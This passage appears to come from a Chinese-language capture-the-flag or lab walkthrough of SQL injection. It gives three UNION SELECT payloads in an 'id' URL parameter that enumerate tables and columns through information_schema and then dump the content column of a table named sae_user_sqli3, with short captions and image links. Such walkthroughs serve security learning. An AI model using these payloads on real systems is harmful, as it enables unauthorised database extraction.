```
`?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()`
```

![](../Images/57a0588c278136af63efa414f825e4bb.png)查询字段名为id,title,content 

*   

```
`?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=sae_user_sqli3`
```

![](../Images/574f5604d83ec54c7341a1943cb093ca.png)查询字段内容

```
`?id=-1 union select 1,2,content from sae_user_sqli3`
```
